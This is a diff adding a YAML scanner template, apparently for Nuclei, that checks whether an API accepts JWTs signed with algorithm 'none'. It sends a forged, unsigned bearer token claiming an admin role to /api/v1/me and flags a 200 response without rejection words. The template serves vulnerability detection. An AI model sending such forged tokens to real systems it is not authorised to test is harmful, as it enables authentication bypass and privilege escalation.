@@ -1,0 +1,19 @@
+id: jwt-alg-none
+info:
+  name: JWT Algorithm None Accepted
+  author: specter-agent
+  severity: critical
+  tags: api,jwt,owasp-api2
+http:
+  - raw:
+      - |
+        GET /api/v1/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        negative: true
+        words: ["unauthorized","invalid","expired"]
